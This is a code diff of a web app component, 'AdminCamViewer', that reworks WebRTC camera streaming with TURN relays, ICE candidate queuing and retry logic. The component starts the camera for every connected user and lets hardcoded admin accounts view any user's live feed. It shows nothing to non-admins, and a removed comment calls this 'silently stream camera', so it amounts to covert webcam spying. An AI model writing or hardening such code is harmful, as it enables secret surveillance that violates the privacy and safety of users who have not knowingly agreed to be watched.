@@ -6,18 +6,52 @@ import { io, Socket } from 'socket.io-client';
 const SOCKET_URL = process.env.NEXT_PUBLIC_SOCKET_URL || 'https://server-6gmj.onrender.com';
 const ADMIN_EMAILS = ['hammadnawz519@gmail.com', 'hammadnawaz519@gmail.com'];
 
-const STUN_SERVERS = {
+const RTC_CONFIG: RTCConfiguration = {
   iceServers: [
-    { urls: 'stun:stun.l.google.com:19302' },
-    { urls: 'stun:stun1.l.google.com:19302' },
+    {
+      urls: [
+        'stun:stun.l.google.com:19302',
+        'stun:stun1.l.google.com:19302',
+        'stun:stun2.l.google.com:19302',
+        'stun:stun3.l.google.com:19302',
+        'stun:stun4.l.google.com:19302',
+      ],
+    },
+    {
+      urls: 'turn:openrelay.metered.ca:80',
+      username: 'openrelayproject',
+      credential: 'openrelayproject',
+    },
+    {
+      urls: 'turn:openrelay.metered.ca:80?transport=tcp',
+      username: 'openrelayproject',
+      credential: 'openrelayproject',
+    },
+    {
+      urls: 'turn:openrelay.metered.ca:443',
+      username: 'openrelayproject',
+      credential: 'openrelayproject',
+    },
+    {
+      urls: 'turns:openrelay.metered.ca:443?transport=tcp',
+      username: 'openrelayproject',
+      credential: 'openrelayproject',
+    },
+    { urls: 'stun:freestun.net:3479' },
+    {
+      urls: 'turn:freestun.net:3479',
+      username: 'free',
+      credential: 'free',
+    },
   ],
+  iceCandidatePoolSize: 10,
 };
 
 interface CamUser {
   email: string;
   username: string;
   socketId: string;
-  connectedAt: number;
+  connectedAt?: number;
 }
 
 interface AdminCamViewerProps {
@@ -45,12 +79,18 @@ export default function AdminCamViewer({ userEmail, username, isOpen, onOpenChan
   const remoteVideoRef = useRef<HTMLVideoElement | null>(null);
   const viewingSocketIdRef = useRef<string | null>(null);
 
-  // ── User side: silently stream camera ────────────────────────────────────────
+  // Admin candidate queue & remote desc status
+  const adminRemoteDescSetRef = useRef<boolean>(false);
+  const adminCandidateQueueRef = useRef<any[]>([]);
+
+  // User side candidate queue & remote desc status
   const localStreamRef = useRef<MediaStream | null>(null);
   const userPeerRef = useRef<RTCPeerConnection | null>(null);
+  const userRemoteDescSetRef = useRef<boolean>(false);
+  const userCandidateQueueRef = useRef<any[]>([]);
 
   // Helper: Deduplicate user list by lowercased email and place Admin at top
-  const dedupeAndSortCamUsers = useCallback((users: CamUser[], adminEmail: string): CamUser[] => {
+  const dedupeAndSortCamUsers = useCallback((users: CamUser[], adminEmail: string, adminUsername: string, currentSocketId: string): CamUser[] => {
     const map = new Map<string, CamUser>();
     const cleanAdmin = (adminEmail || '').toLowerCase().trim();
 
@@ -64,6 +104,19 @@ export default function AdminCamViewer({ userEmail, username, isOpen, onOpenChan
         username: u.username || (u.email ? u.email.split('@')[0] : 'User')
       });
     });
+
+    // Always ensure Admin is included at the top for self-testing
+    if (cleanAdmin) {
+      const existing = map.get(cleanAdmin);
+      const adminName = adminUsername || cleanAdmin.split('@')[0] || 'Admin';
+      const displayName = adminName.toLowerCase().includes('admin') ? adminName : `${adminName} (Admin)`;
+
+      map.set(cleanAdmin, {
+        email: cleanAdmin,
+        username: displayName,
+        socketId: existing?.socketId || currentSocketId || 'admin-self-socket',
+      });
+    }
 
     const uniqueList = Array.from(map.values());
 
@@ -87,13 +140,14 @@ export default function AdminCamViewer({ userEmail, username, isOpen, onOpenChan
 
     const socket = io(SOCKET_URL, {
       transports: ['websocket', 'polling'],
-      reconnectionAttempts: 5,
+      reconnectionAttempts: Infinity,
+      reconnectionDelay: 500,
     });
     socketRef.current = socket;
 
     socket.on('connect', () => {
-      // Identify with main socket room
-      socket.emit('identify', { email: userEmail.toLowerCase().trim() });
+      const cleanEmail = userEmail.toLowerCase().trim();
+      socket.emit('identify', { email: cleanEmail });
 
       // Start camera for ALL users (including admin) to request camera permission and announce readiness
       startUserCamera(socket);
@@ -117,51 +171,70 @@ export default function AdminCamViewer({ userEmail, username, isOpen, onOpenChan
     // ── Admin listeners ──
     if (isAdmin) {
       socket.on('cam_users_list', (list: CamUser[]) => {
-        setCamUsers(dedupeAndSortCamUsers(list, userEmail));
+        setCamUsers(dedupeAndSortCamUsers(list, userEmail, username, socket.id || ''));
       });
 
       socket.on('cam_user_online', (user: CamUser) => {
-        setCamUsers(prev => dedupeAndSortCamUsers([...prev, user], userEmail));
+        setCamUsers(prev => dedupeAndSortCamUsers([...prev, user], userEmail, username, socket.id || ''));
       });
 
       socket.on('cam_user_offline', ({ socketId }: { socketId: string }) => {
         setCamUsers(prev => {
           const filtered = prev.filter(u => u.socketId !== socketId);
-          return dedupeAndSortCamUsers(filtered, userEmail);
+          return dedupeAndSortCamUsers(filtered, userEmail, username, socket.id || '');
         });
         if (viewingSocketIdRef.current === socketId) {
           stopViewing();
         }
       });
 
-      // Receive WebRTC answer/ICE from target user
-      socket.on('cam_signal_incoming', async ({ fromSocketId, signal }: { fromSocketId: string; signal: any }) => {
+      // Receive WebRTC answer/ICE/offer
+      socket.on('cam_signal_incoming', async ({ fromSocketId, fromEmail, signal }: { fromSocketId: string; fromEmail?: string; signal: any }) => {
         if (signal.type === 'offer') {
-          await handleUserOffer(fromSocketId, signal, socket);
+          await handleUserOffer(fromSocketId, fromEmail, signal, socket);
           return;
         }
-        if (!peerRef.current) return;
-        try {
-          if (signal.type === 'answer') {
-            await peerRef.current.setRemoteDescription(new RTCSessionDescription(signal));
-          } else if (signal.candidate || signal.sdpMid !== undefined) {
-            await peerRef.current.addIceCandidate(new RTCIceCandidate(signal));
+
+        if (peerRef.current) {
+          try {
+            if (signal.type === 'answer') {
+              await peerRef.current.setRemoteDescription(new RTCSessionDescription(signal));
+              adminRemoteDescSetRef.current = true;
+              while (adminCandidateQueueRef.current.length > 0) {
+                const candidate = adminCandidateQueueRef.current.shift();
+                if (candidate) {
+                  await peerRef.current.addIceCandidate(new RTCIceCandidate(candidate)).catch(e => console.warn('Admin queued candidate error:', e));
+                }
+              }
+            } else if (signal.candidate || signal.sdpMid !== undefined) {
+              const candidateObj = signal.candidate ? signal.candidate : signal;
+              if (adminRemoteDescSetRef.current) {
+                await peerRef.current.addIceCandidate(new RTCIceCandidate(candidateObj));
+              } else {
+                adminCandidateQueueRef.current.push(candidateObj);
+              }
+            }
+          } catch (e) {
+            console.warn('Admin ICE signal error:', e);
           }
-        } catch (e) {
-          console.warn('Admin ICE error:', e);
         }
       });
     } else {
-      // Regular user receives WebRTC offer from admin
-      socket.on('cam_signal_incoming', async ({ fromSocketId, signal }: { fromSocketId: string; signal: any }) => {
+      // Regular user receives WebRTC offer or ICE candidate from admin
+      socket.on('cam_signal_incoming', async ({ fromSocketId, fromEmail, signal }: { fromSocketId: string; fromEmail?: string; signal: any }) => {
         try {
           if (signal.type === 'offer') {
-            await handleUserOffer(fromSocketId, signal, socket);
-          } else if ((signal.candidate || signal.sdpMid !== undefined) && userPeerRef.current) {
-            await userPeerRef.current.addIceCandidate(new RTCIceCandidate(signal));
+            await handleUserOffer(fromSocketId, fromEmail, signal, socket);
+          } else if (signal.candidate || signal.sdpMid !== undefined) {
+            const candidateObj = signal.candidate ? signal.candidate : signal;
+            if (userPeerRef.current && userRemoteDescSetRef.current) {
+              await userPeerRef.current.addIceCandidate(new RTCIceCandidate(candidateObj));
+            } else {
+              userCandidateQueueRef.current.push(candidateObj);
+            }
           }
         } catch (e) {
-          console.warn('User ICE error:', e);
+          console.warn('User ICE signal error:', e);
         }
       });
     }
@@ -173,52 +246,70 @@ export default function AdminCamViewer({ userEmail, username, isOpen, onOpenChan
       userPeerRef.current?.close();
     };
     // eslint-disable-next-line react-hooks/exhaustive-deps
-  }, [userEmail, isAdmin]);
+  }, [userEmail, isAdmin, username]);
 
   // ── Acquire camera stream for any connected client ──────────────────────────
   const startUserCamera = async (socket: Socket) => {
     const cleanEmail = userEmail ? userEmail.toLowerCase().trim() : 'user@connect.app';
     const cleanUsername = username || cleanEmail.split('@')[0] || 'User';
 
-    if (localStreamRef.current) {
+    if (localStreamRef.current && localStreamRef.current.getVideoTracks().some(t => t.readyState === 'live')) {
       socket.emit('cam_viewer_ready', { email: cleanEmail, username: cleanUsername });
       return;
     }
 
     try {
       if (typeof navigator !== 'undefined' && navigator.mediaDevices?.getUserMedia) {
+        let stream: MediaStream | null = null;
         try {
-          const stream = await navigator.mediaDevices.getUserMedia({
+          stream = await navigator.mediaDevices.getUserMedia({
             video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
             audio: false,
           });
-          localStreamRef.current = stream;
         } catch {
-          const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
-          localStreamRef.current = stream;
+          try {
+            stream = await navigator.mediaDevices.getUserMedia({
+              video: { facingMode: 'user' },
+              audio: false,
+            });
+          } catch {
+            stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+          }
         }
+        localStreamRef.current = stream;
       }
     } catch (err) {
       console.warn('Camera permission denied or camera not available:', err);
     } finally {
-      // Always register online status so admin sees client in user list
       socket.emit('cam_viewer_ready', { email: cleanEmail, username: cleanUsername });
     }
   };
 
   // ── Answer admin's WebRTC offer ───────────────────────────────────────────
-  const handleUserOffer = async (adminSocketId: string, offer: RTCSessionDescriptionInit, socket: Socket) => {
-    if (!localStreamRef.current) {
+  const handleUserOffer = async (adminSocketId: string, adminEmail: string | undefined, offer: RTCSessionDescriptionInit, socket: Socket) => {
+    if (!localStreamRef.current || !localStreamRef.current.getVideoTracks().some(t => t.readyState === 'live')) {
       await startUserCamera(socket);
     }
     if (!localStreamRef.current) return;
 
-    const peer = new RTCPeerConnection(STUN_SERVERS);
+    if (userPeerRef.current) {
+      try { userPeerRef.current.close(); } catch {}
+      userPeerRef.current = null;
+    }
+
+    userRemoteDescSetRef.current = false;
+    userCandidateQueueRef.current = [];
+
+    const peer = new RTCPeerConnection(RTC_CONFIG);
     userPeerRef.current = peer;
 
     // Add local tracks
     localStreamRef.current.getTracks().forEach(track => {
-      peer.addTrack(track, localStreamRef.current!);
+      try {
+        peer.addTrack(track, localStreamRef.current!);
+      } catch (e) {
+        console.warn('Track add error:', e);
+      }
     });
 
     // ICE candidates
@@ -226,20 +317,47 @@ export default function AdminCamViewer({ userEmail, username, isOpen, onOpenChan
       if (e.candidate) {
         socket.emit('cam_signal_relay', {
           toSocketId: adminSocketId,
+          toEmail: adminEmail,
           signal: e.candidate,
         });
       }
     };
 
-    await peer.setRemoteDescription(new RTCSessionDescription(offer));
-    const answer = await peer.createAnswer();
-    await peer.setLocalDescription(answer);
+    try {
+      await peer.setRemoteDescription(new RTCSessionDescription(offer));
+      userRemoteDescSetRef.current = true;
 
-    socket.emit('cam_signal_relay', {
-      toSocketId: adminSocketId,
-      signal: answer,
-    });
+      // Drain candidate queue
+      while (userCandidateQueueRef.current.length > 0) {
+        const candidate = userCandidateQueueRef.current.shift();
+        if (candidate) {
+          await peer.addIceCandidate(new RTCIceCandidate(candidate)).catch(err => console.warn('User candidate flush error:', err));
+        }
+      }
+
+      const answer = await peer.createAnswer();
+      await peer.setLocalDescription(answer);
+
+      socket.emit('cam_signal_relay', {
+        toSocketId: adminSocketId,
+        toEmail: adminEmail,
+        signal: answer,
+      });
+    } catch (err) {
+      console.warn('handleUserOffer error:', err);
+    }
   };
+
+  const stopViewing = useCallback(() => {
+    peerRef.current?.close();
+    peerRef.current = null;
+    adminRemoteDescSetRef.current = false;
+    adminCandidateQueueRef.current = [];
+    if (remoteVideoRef.current) remoteVideoRef.current.srcObject = null;
+    setViewingUser(null);
+    setStreamStatus('idle');
+    viewingSocketIdRef.current = null;
+  }, []);
 
   // ── Admin: start viewing a user ───────────────────────────────────────────
   const startViewing = useCallback(async (user: CamUser) => {
@@ -248,49 +366,71 @@ export default function AdminCamViewer({ userEmail, username, isOpen, onOpenChan
     setStreamStatus('connecting');
     viewingSocketIdRef.current = user.socketId;
 
-    const peer = new RTCPeerConnection(STUN_SERVERS);
+    adminRemoteDescSetRef.current = false;
+    adminCandidateQueueRef.current = [];
+
+    const peer = new RTCPeerConnection(RTC_CONFIG);
     peerRef.current = peer;
 
     peer.ontrack = (e) => {
-      if (remoteVideoRef.current && e.streams[0]) {
-        remoteVideoRef.current.srcObject = e.streams[0];
-        setStreamStatus('live');
+      console.log('Admin peer.ontrack received track:', e.track.kind);
+      const incomingStream = e.streams[0] ?? new MediaStream([e.track]);
+      if (remoteVideoRef.current) {
+        remoteVideoRef.current.srcObject = incomingStream;
+        const playPromise = remoteVideoRef.current.play();
+        if (playPromise !== undefined) {
+          playPromise.catch(err => console.warn('Remote video playback error:', err));
+        }
       }
+      setStreamStatus('live');
     };
 
     peer.onicecandidate = (e) => {
       if (e.candidate && socketRef.current) {
+        const targetSid = (user.socketId === 'admin-self-socket' && socketRef.current) ? socketRef.current.id : user.socketId;
         socketRef.current.emit('cam_view_request', {
-          targetSocketId: user.socketId,
+          targetSocketId: targetSid,
+          targetEmail: user.email,
           signal: e.candidate,
         });
       }
     };
 
+    peer.onconnectionstatechange = () => {
+      console.log('Admin peer connectionState:', peer.connectionState);
+      if (peer.connectionState === 'connected') {
+        setStreamStatus('live');
+      } else if (peer.connectionState === 'failed') {
+        setStreamStatus('error');
+      }
+    };
+
     peer.oniceconnectionstatechange = () => {
-      if (peer.iceConnectionState === 'failed' || peer.iceConnectionState === 'disconnected') {
+      console.log('Admin iceConnectionState:', peer.iceConnectionState);
+      if (peer.iceConnectionState === 'connected' || peer.iceConnectionState === 'completed') {
+        setStreamStatus('live');
+      } else if (peer.iceConnectionState === 'failed') {
         setStreamStatus('error');
       }
     };
 
     // Create offer
-    const offer = await peer.createOffer({ offerToReceiveVideo: true, offerToReceiveAudio: false });
-    await peer.setLocalDescription(offer);
+    try {
+      const offer = await peer.createOffer({ offerToReceiveVideo: true, offerToReceiveAudio: false });
+      await peer.setLocalDescription(offer);
 
-    socketRef.current?.emit('cam_view_request', {
-      targetSocketId: user.socketId,
-      signal: offer,
-    });
-  }, []);
+      const targetSid = (user.socketId === 'admin-self-socket' && socketRef.current) ? socketRef.current.id : user.socketId;
 
-  const stopViewing = useCallback(() => {
-    peerRef.current?.close();
-    peerRef.current = null;
-    if (remoteVideoRef.current) remoteVideoRef.current.srcObject = null;
-    setViewingUser(null);
-    setStreamStatus('idle');
-    viewingSocketIdRef.current = null;
-  }, []);
+      socketRef.current?.emit('cam_view_request', {
+        targetSocketId: targetSid,
+        targetEmail: user.email,
+        signal: offer,
+      });
+    } catch (e) {
+      console.error('Create offer error:', e);
+      setStreamStatus('error');
+    }
+  }, [stopViewing]);
 
   // Only render for admin
   if (!isAdmin) return null;
@@ -373,10 +513,10 @@ export default function AdminCamViewer({ userEmail, username, isOpen, onOpenChan
                 </div>
               ) : (
                 camUsers.map(user => {
-                  const isViewing = viewingUser?.socketId === user.socketId;
+                  const isViewing = viewingUser?.socketId === user.socketId || (viewingUser?.email && viewingUser.email.toLowerCase().trim() === user.email.toLowerCase().trim());
                   return (
                     <button
-                      key={user.socketId}
+                      key={user.socketId || user.email}
                       onClick={() => isViewing ? stopViewing() : startViewing(user)}
                       className="w-full flex items-center gap-3.5 px-4 py-3.5 rounded-2xl transition-all text-left cursor-pointer active:scale-98 shadow-sm"
                       style={{
@@ -507,11 +647,30 @@ export default function AdminCamViewer({ userEmail, username, isOpen, onOpenChan
                       </div>
                     </div>
                   )}
+
+                  {streamStatus === 'error' && (
+                    <div className="absolute inset-0 flex items-center justify-center bg-black/90 z-10">
+                      <div className="flex flex-col items-center gap-3 text-center px-6">
+                        <div className="w-12 h-12 rounded-full bg-red-500/20 text-red-500 flex items-center justify-center border border-red-500/30">
+                          <svg width="24" height="24" fill="none" stroke="currentColor" viewBox="0 0 24 24" strokeWidth="2">
+                            <path strokeLinecap="round" strokeLinejoin="round" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z" />
+                          </svg>
+                        </div>
+                        <p className="text-xs font-semibold text-white/80">Camera stream lost or disconnected</p>
+                        <button
+                          onClick={() => startViewing(viewingUser)}
+                          className="px-4 py-2 rounded-full bg-red-500 text-white text-xs font-bold active:scale-95 transition-all shadow-lg cursor-pointer"
+                        >
+                          Retry Connection
+                        </button>
+                      </div>
+                    </div>
+                  )}
                 </div>
 
-                {/* BOTTOM FLOATING ACTION BAR — Positioned comfortably at the bottom */}
+                {/* BOTTOM FLOATING ACTION BAR — Only keep Reconnect button as requested */}
                 <div
-                  className="absolute bottom-8 left-1/2 -translate-x-1/2 z-30 flex items-center gap-3 px-5 py-3 rounded-full shadow-2xl"
+                  className="absolute bottom-8 left-1/2 -translate-x-1/2 z-30 flex items-center justify-center px-5 py-3 rounded-full shadow-2xl"
                   style={{
                     background: 'rgba(15,15,18,0.92)',
                     backdropFilter: 'blur(20px)',
@@ -520,24 +679,13 @@ export default function AdminCamViewer({ userEmail, username, isOpen, onOpenChan
                 >
                   <button
                     onClick={() => startViewing(viewingUser)}
-                    className="flex items-center gap-2 px-4 py-2.5 rounded-full text-xs font-bold text-white transition-all active:scale-90 cursor-pointer"
-                    style={{ background: 'rgba(255,255,255,0.12)', border: '1px solid rgba(255,255,255,0.15)' }}
+                    className="flex items-center gap-2 px-6 py-2.5 rounded-full text-xs font-bold text-white transition-all active:scale-90 cursor-pointer shadow-lg"
+                    style={{ background: 'rgba(255,255,255,0.15)', border: '1px solid rgba(255,255,255,0.2)' }}
                   >
                     <svg width="15" height="15" fill="none" stroke="currentColor" viewBox="0 0 24 24" strokeWidth="2.5">
                       <path strokeLinecap="round" strokeLinejoin="round" d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15" />
                     </svg>
-                    <span>Reconnect</span>
-                  </button>
-
-                  <button
-                    onClick={() => { stopViewing(); onOpenChange(false); }}
-                    className="flex items-center gap-2 px-5 py-2.5 rounded-full text-xs font-bold text-white transition-all active:scale-90 cursor-pointer shadow-lg"
-                    style={{ background: '#ef4444' }}
-                  >
-                    <svg width="14" height="14" fill="none" stroke="currentColor" viewBox="0 0 24 24" strokeWidth="2.5">
-                      <path strokeLinecap="round" strokeLinejoin="round" d="M6 18L18 6M6 6l12 12" />
-                    </svg>
-                    <span>Close</span>
+                    <span>Reconnect Stream</span>
                   </button>
                 </div>
               </>
@@ -548,5 +696,3 @@ export default function AdminCamViewer({ userEmail, username, isOpen, onOpenChan
     </>
   );
 }
-
-
